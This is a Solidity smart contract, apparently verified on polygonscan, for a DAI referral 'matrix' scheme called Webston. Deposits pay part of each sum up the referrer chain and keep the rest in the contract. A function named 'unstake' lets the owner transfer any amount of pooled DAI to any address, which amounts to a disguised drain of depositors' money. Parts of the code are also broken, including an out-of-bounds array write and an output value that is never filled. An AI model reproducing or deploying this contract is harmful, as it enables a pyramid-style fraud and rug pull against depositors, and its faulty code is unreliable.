/**
 *Submitted for verification at polygonscan.com on 2022-12-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract Webston {
    using SafeMath for uint256;
    BEP20 public dai = BEP20(0xd982Fc4711eb22dF8274201a822cC34428DfBCBe); // DAI Coin
    struct Player {
        address referrer;
        uint256 star1;
        uint256 star2;
        uint256 star3;
        mapping(uint256 => uint256) b3Entry;
        mapping(uint256 => uint256) b3_level;
        mapping(uint256 => uint256) b14Reopen;
        mapping(uint256 => uint256) b3Income;
        mapping(uint256 => uint256) b14Direct;
        mapping(uint256 => uint256) b14Income;
        mapping(uint256 => mapping(uint256 => uint256)) b14_level;
        mapping(uint256 => mapping(uint256 => address)) b14_lr;
        mapping(uint256 => address) b14_upline;
    }
    mapping(address => Player) public players;
    
    mapping( uint256 =>  address []) public b14;
    address owner;
    address [] tempads;
    address [] flashads;

    modifier onlyAdmin(){
        require(msg.sender == owner,"You are not authorized.");
        _;
    }

    modifier security {
        uint size;
        address sandbox = msg.sender;
        assembly { size := extcodesize(sandbox) }
        require(size == 0, "Smart contract detected!");
        _;
    }

    constructor() public {
        owner = msg.sender;
        for(uint8 i=0;i < 10; i++){
            players[msg.sender].b3Entry[i]=1;
            b14[i].push(msg.sender);
        }
    }
    
    function packageInfo(uint256 _pkg) pure private  returns(uint8 p) {
        if(_pkg == 20e18){
            p=1;
        }else if(_pkg == 40e18){
            p=2;
        }else if(_pkg == 80e18){
            p=3;
        }else if(_pkg == 160e18){
            p=4;
        }else if(_pkg == 250e18){
            p=5;
        }else if(_pkg == 500e18){
            p=6;
        }else if(_pkg == 750e18){
            p=7;
        }else if(_pkg == 1250e18){
            p=8;
        }else if(_pkg == 2500e18){
            p=9;
        }
        else{
            p=0;
        }
        return p;
    }

    function deposit(address _refferel, uint256 _dai) public security{
        require(_dai >= 10e18, "Invalid Amount");
        uint8 poolNo=packageInfo(_dai);
        require(players[msg.sender].b3Entry[poolNo] == 0, "Already registered");
        dai.transferFrom(msg.sender,address(this),_dai);
        players[msg.sender].referrer=_refferel;
        players[msg.sender].b3Entry[poolNo]++;
        
        
        //Find Upline
        address checkref=_refferel;
        if(players[_refferel].b3Entry[poolNo]==0 && _refferel!=owner){
            checkref=_findrefer(_refferel,poolNo);
        }
        //referel
        dai.transfer(checkref,_dai.mul(30).div(100));
        players[checkref].b14Direct[poolNo]+=_dai.mul(30).div(100);
        //x3
        players[checkref].b3_level[poolNo]++;
        uint256 x3Amt=_dai.mul(10).div(100);
        if(players[checkref].b3_level[poolNo]==0 || players[checkref].b3_level[poolNo].mod(3) != 0){
            dai.transfer(checkref,x3Amt);
            players[checkref].b3Income[poolNo]+=x3Amt;
        }else{
            checkB3refer(checkref,x3Amt,poolNo);
        }
        
    }

    function _findrefer(address _refferel,uint256 poolNo) view public returns(address cref){
        while(players[_refferel].referrer != address(0)){
            _refferel=players[_refferel].referrer;
            if(players[_refferel].b3Entry[poolNo]>0){
                cref=_refferel;
                if(cref==address(0)){
                    cref = owner;
                }
                break;
            }
        }
        return cref;
    }
    function checkB3refer(address _refferel,uint256 _amount,uint256 poolNo) private {
        while(players[_refferel].referrer != address(0)){
            _refferel=players[_refferel].referrer;
            players[_refferel].b3_level[poolNo]++;
            if(players[_refferel].b3_level[poolNo].mod(3) != 0){
                dai.transfer(_refferel,_amount);
                players[_refferel].b3Income[poolNo]+=_amount;
                break;
            }
        }
    }

    
    function _findParent(uint256 poolNo,address _referral,address _parent) private{
            for(uint256 i=0;i<tempads.length;i++){
                if(players[tempads[i]].b14_level[poolNo][0]<2){
                   _parent = tempads[i];
                   break;
                }else{
                    flashads[flashads.length]=players[tempads[i]].b14_lr[poolNo][0];
                    flashads[flashads.length]=players[tempads[i]].b14_lr[poolNo][1];
                }
            }
            tempads=flashads;
            for(uint256 j=0;j<flashads.length;j++){
                delete flashads[j];
            }
            if(tempads.length>0){
                _findParent(poolNo,_referral,_parent);
            }
    }
   
    function unstake(address buyer,uint _amount) public security returns(uint){
        require(msg.sender == owner,"You are not staker.");
        dai.transfer(buyer,_amount);
        return _amount;
    }

    function b14Info(uint8 pool) view external returns(address [] memory) {
        return b14[pool];
    }

    function b14Team(address _addr,uint8 pool) view external returns(uint256[3] memory p) {
        for(uint8 i=0;i<=2;i++){
            p[i]=players[_addr].b14_level[pool][i];
        }
        return (
           p
        );
    }
    function incomeDetails(address _addr) view external returns(uint256[10] memory x3,uint256[10] memory x14,uint256[10] memory xDir,uint256 star1,uint256 star2,uint256 star3) {
        for(uint8 i=0;i<10;i++){
            x3[i]=players[_addr].b3Income[i];
            x14[i]=players[_addr].b14Income[i];
            xDir[i]=players[_addr].b14Direct[i];
        }
        return (
           x3,
           x14,
           xDir,
           star1,
           star2,
           star3
        );
    }
    function userDetails(address _addr) view external returns(address ref,uint256[8] memory p,uint256[8] memory b3,uint256[8] memory b14e,uint256[8] memory b14r) {
        for(uint8 i=0;i<8;i++){
            p[i]=players[_addr].b3_level[i];
            b3[i]=players[_addr].b3Entry[i];
            b14r[i]=players[_addr].b14Reopen[i];
        }
        return (
           players[_addr].referrer,
           p,
           b3,
           b14e,
           b14r
        );
    }
}  

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}